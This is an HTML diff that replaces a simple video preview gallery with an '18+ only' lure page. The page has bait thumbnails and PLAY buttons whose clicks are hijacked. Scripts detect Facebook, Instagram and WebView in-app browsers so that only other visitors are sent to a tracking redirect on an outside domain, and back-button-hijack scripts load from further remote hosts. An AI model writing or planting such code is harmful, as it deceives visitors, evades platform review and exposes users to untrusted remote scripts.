@@ -1,74 +1,46 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Video Preview Gallery</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #111;
-      color: #fff;
-      text-align: center;
-      padding: 20px;
+
+<script>
+        document.addEventListener('DOMContentLoaded', function () {
+            setTimeout(function () {
+                 $("").insertAfter('body');
+            }, 2000); // Delay of 2 seconds
+        });
+    </script><!DOCTYPE html><html xmlns="http://www.w3.org/1999/html"><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><base href="/"><style>body {background: #000000;text-align: center;color: #fff;font-family: Arial, sans-serif;}a {text-decoration: none;}button {display: block;margin-left: auto;margin-right: auto;height: 30px;width: 70px;background: #71F5F5;border: 1px solid #0EEFEF;color: #000;text-align: center;font-size: 14px;font-weight: 700;}td {padding: 5px;}img {border: 1px solid #fff;}.all {display: block;margin-top: 20px;margin-left: auto;margin-right: auto;height: 70px;width: 90%;max-width: 200px;background: #3FF2F2;border: 1px solid #0EEFEF;color: #000;font-size: 18px;font-weight: 700;}.girl1 {width: 160px !important;height: 160px !important;}.girl2 {width: 160px !important;height: 160px !important;}.girl3 {width: 160px !important;height: 160px !important;}.girl4 {width: 160px !important;height: 160px !important;}@media screen and (max-width: 400px) {button {display: block;margin-left: auto;margin-right: auto;background: #71F5F5;border: 1px solid #0EEFEF;color: #000;text-align: center;font-size: 15px;font-weight: 700;}td {padding: 10px;}.girl1 {width: 140px !important;height: 140px !important;}.girl2 {width: 140px !important;height: 140px !important;}.girl3 {width: 140px !important;height: 140px !important;}.girl4 {width: 140px !important;height: 140px !important;}}</style></head><body><meta http="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="generator" content="7.0.314.244"><title>+ 18 Only</title><meta name="viewport" content="width=180"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><table align="center"><tbody><tr><td><a class="popu" href="https://yahoo.com" id="af1"><img class="girl1" style="width: 150px" src="https://lpgallery.s3.eu-central-1.amazonaws.com/Adult_Content/adult_67dc08f521ea7.png"></a></td><td><a class="popu" href="https://yahoo.com" id="af3"><img class="girl2" style="width: 172px" src="https://lpgallery.s3.eu-central-1.amazonaws.com/restricted_content/content_restriction_error_67dc08f785013.png"></a></td></tr><tr><td><a class="popu" href="https://yahoo.com" id="btplay"><button>PLAY</button></a></td><td><a class="popu" href="https://yahoo.com" id="btplay"><button>PLAY</button></a></td></tr><tr><td><a class="popu" href="https://yahoo.com" id="af2"><img class="girl3" style="width: 195px" src="https://lpgallery.s3.eu-central-1.amazonaws.com/Adult_Content/adult_67dc08f895958.png"></a></td><td><a class="popu" href="https://yahoo.com" id="af4"><img class="girl4" style="width: 150px;" src="https://lpgallery.s3.eu-central-1.amazonaws.com/restricted_content/content_restriction_error_67dc08ff776f0.png"></a></td></tr><tr><td><a class="popu" href="https://yahoo.com" id="btplay"><button>PLAY</button></a></td><td><a class="popu" href="https://yahoo.com" id="btplay"><button>PLAY</button></a></td></tr></tbody></table><a class="popu" href="https://yahoo.com" id="watchall"><button class="all">WATCH ALL</button></a><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ua-parser-js/src/ua-parser.min.js"></script>
+<script type="text/javascript">
+    var isinapp = false;
+    var uap = new UAParser();
+    var result = uap.getResult();
+    console.log(result.browser.name);
+    var inapparr = ["Chrome Webview", "Chrome WebView", "Facebook", "WebKit", "Instagram"];
+    if (inapparr.includes(result.browser.name)) {
+        isinapp = true;
     }
-    .gallery {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 20px;
-    }
-    .video-thumb {
-      position: relative;
-      width: 300px;
-      height: 170px;
-      cursor: pointer;
-      overflow: hidden;
-      border-radius: 10px;
-    }
-    .video-thumb img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      display: block;
-      border: 2px solid #333;
-    }
-    .play-button {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      width: 60px;
-      height: 60px;
-      background: url('https://upload.wikimedia.org/wikipedia/commons/7/70/HD_transparent_picture.png') no-repeat center;
-      background-size: contain;
-      transform: translate(-50%, -50%);
-      pointer-events: none;
-    }
-  </style>
-</head>
-<body>
-  <h1>Video Preview Gallery</h1>
-  <div class="gallery">
-    <a href="https://example.com/video1" target="_blank" class="video-thumb">
-      <img src="https://via.placeholder.com/300x170?text=Video+1" alt="Video 1">
-      <div class="play-button"></div>
-    </a>
-    <a href="https://example.com/video2" target="_blank" class="video-thumb">
-      <img src="https://via.placeholder.com/300x170?text=Video+2" alt="Video 2">
-      <div class="play-button"></div>
-    </a>
-    <a href="https://example.com/video3" target="_blank" class="video-thumb">
-      <img src="https://via.placeholder.com/300x170?text=Video+3" alt="Video 3">
-      <div class="play-button"></div>
-    </a>
-    <a href="https://example.com/video4" target="_blank" class="video-thumb">
-      <img src="https://via.placeholder.com/300x170?text=Video+4" alt="Video 4">
-      <div class="play-button"></div>
-    </a>
-    <a href="https://example.com/video5" target="_blank" class="video-thumb">
-      <img src="https://via.placeholder.com/300x170?text=Video+5" alt="Video 5">
-      <div class="play-button"></div>
-    </a>
-  </div>
-</body>
-</html>
+    console.log(isinapp);
+ 
+
+    $(".popu").on("click", function(event) {
+		event.preventDefault();
+		window.onbeforeunload = null;
+		if (isinapp == false) {
+            var url = "https://lion.chairhelmet.com/?jp=646633482574b&linkref=14061_99_99&ref=wxxw";
+            var currenturl = "https://yahoo.com";
+            window.open(currenturl, "s").blur();
+            window.location.href = url;
+        }
+        else {
+            window.location.href = "https://yahoo.com";
+        }
+
+    });
+</script>
+<script>
+      var Back_Button_Zone = 8025831;
+      var Domain_TB = "soseereeds.net";
+    </script>
+<script async="" src="https://desenteir.com/5d2/59323/reverse.min.js?sf=1"></script>
+<script src="https://cdn.jsdelivr.net/npm/ua-parser-js/src/ua-parser.min.js"></script>
+<script async src="https://desenteir.com/2af/421e3/reverse.min.js?sf=1"></script>
+
+<script type="text/javascript">var ip = "{ip}";</script>
+<script type="text/javascript">$(document).ready(function () {}); </script></body></html>
